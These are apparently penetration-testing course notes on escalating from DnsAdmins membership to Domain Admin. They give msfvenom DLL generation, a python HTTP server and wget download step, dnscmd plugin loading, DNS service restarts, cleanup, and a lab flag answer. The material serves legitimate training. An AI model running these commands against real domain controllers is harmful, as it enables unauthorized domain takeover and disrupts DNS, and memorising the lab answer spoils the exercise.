# DnsAdmins

## ID
705

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 12 — DnsAdmins

## Description
Abuse DnsAdmins group membership to load a custom DLL into the DNS service (running as SYSTEM), escalating to Domain Admin by adding a user to the DA group or obtaining a reverse shell.

## Tags
dnsadmins, dll-injection, dnscmd, privilege-escalation, domain-controller, windows

## Commands
- `msfvenom -p windows/x64/exec cmd='net group "domain admins" <USER> /add /domain' -f dll -o adduser.dll`
- `dnscmd.exe /config /serverlevelplugindll <FULL_DLL_PATH>`
- `sc.exe stop dns`
- `sc.exe start dns`
- `sc.exe sdshow DNS` (check service permissions for your SID)
- `wmic useraccount where name="<USER>" get sid`
- `reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f` (cleanup)

## What This Section Covers
DnsAdmins group members can configure the DNS service to load a custom DLL via the `ServerLevelPluginDll` registry key. Since DNS runs as `NT AUTHORITY\SYSTEM`, the DLL executes with SYSTEM privileges when the service restarts. This can be used to add a user to Domain Admins, spawn a reverse shell, or run arbitrary commands as SYSTEM on the Domain Controller.

## Methodology
1. Confirm DnsAdmins membership: `net localgroup DnsAdmins`.
2. On attack box, generate a malicious DLL with `msfvenom` (add user to DA group, reverse shell, etc.).
3. Host the DLL via `python3 -m http.server` and download it to the target.
4. Load the DLL: `dnscmd.exe /config /serverlevelplugindll <FULL_PATH_TO_DLL>`.
5. Check if you have service start/stop permissions: `sc.exe sdshow DNS` — look for `RPWP` against your SID.
6. Restart DNS: `sc.exe stop dns` then `sc.exe start dns`.
7. Verify: `net group "Domain Admins" /dom` or catch a reverse shell.
8. **Clean up**: delete the registry key and restart DNS.

## Multi-step Workflow
```
# Attack box — generate and serve DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777

# Target — download DLL
wget "http://<PWNBOX_IP>:7777/adduser.dll" -outfile "C:\Users\netadm\Desktop\adduser.dll"

# Target — load DLL and restart DNS
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
sc.exe stop dns
sc.exe start dns

# Verify
net group "Domain Admins" /dom

# SIGN OUT and RDP back in — new group membership only applies to new logon sessions
type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt

# CLEAN UP (from elevated prompt as admin)
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
sc.exe start dns
sc query dns    # confirm RUNNING
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag at `c:\Users\Administrator\Desktop\DnsAdmins\flag.txt` | Dll_abus3_ftw! | msfvenom DLL → dnscmd → restart DNS → sign out → RDP back in → type flag |

## Key Takeaways
- DNS service runs as `NT AUTHORITY\SYSTEM` — any DLL it loads executes with full SYSTEM privileges.
- You **must** specify the full path to the DLL in `dnscmd` or the attack silently fails.
- DnsAdmins members can set `ServerLevelPluginDll` via `dnscmd` but cannot directly edit the registry key.
- The DNS service will fail to start properly after loading a malicious DLL — this is expected. The payload still executes.
- Alternative attacks: load `mimilib.dll` (modified to run commands on every DNS query), or create a WPAD record after disabling the global query block list to hijack traffic with Responder/Inveigh.
- This is a **destructive** attack — it breaks DNS for the entire domain. Always get explicit client approval.

## Gotchas
- If you don't have `RPWP` (SERVICE_START/SERVICE_STOP) on the DNS service, you can't restart it yourself — you'll have to wait for a service or server restart.
- The DLL path must be a local path or a UNC share accessible by the DC machine account — relative paths won't work.
- Always clean up: delete the `ServerLevelPluginDll` registry value and restart DNS, or the service stays broken.
- The DNS service shows `START_PENDING` and may fail after loading the DLL — your payload still ran, check with `net group "Domain Admins" /dom`.
- After adding yourself to Domain Admins, you must **sign out and RDP back in** — the new group membership won't apply to your current session.
